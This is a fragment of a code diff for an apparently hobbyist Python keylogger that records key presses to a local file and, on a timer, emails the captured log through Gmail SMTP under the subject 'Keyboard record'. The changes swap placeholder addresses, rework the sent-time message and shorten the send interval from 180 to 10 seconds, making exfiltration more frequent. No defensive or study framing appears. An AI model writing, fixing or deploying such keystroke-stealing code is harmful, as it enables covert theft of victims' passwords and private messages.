@@ -7,13 +7,14 @@ import datetime
 
 
 def send_email(body):
+            e = datetime.datetime.now()
 
-            gmail_user = 'adress@gmail.com'
+            gmail_user = 'your-add@gmail.com'
             gmail_password = 'psswd'
             message=EmailMessage()
             message['Subject']='Keyboard record'
             message['From']=gmail_user
-            message['To']='address@gmail.com'
+            message['To']='reveiver-add@gmail.com'
             message.set_content(body)
             
 
@@ -29,11 +30,12 @@ def send_email(body):
                smtp_server.send_message(message)
                smtp_server.close()
 
-               x = datetime.datetime.now()
 
-               print (x + "Email sent!")
+
+               print ("Email send at:  %s:%s:%s" % (e.hour, e.minute, e.second))
+
             except Exception as ex:
-               print (x + "Problem in sending email is: ",ex)
+               print ("Problem in sending email is: ",ex)
  
 
 
@@ -56,7 +58,7 @@ def key_pressed(key):
 
 
 def timer():
-   t=Timer(180,timer)
+   t=Timer(10,timer)
    t.start()
    try:
       f=open("keyboard.txt","r")
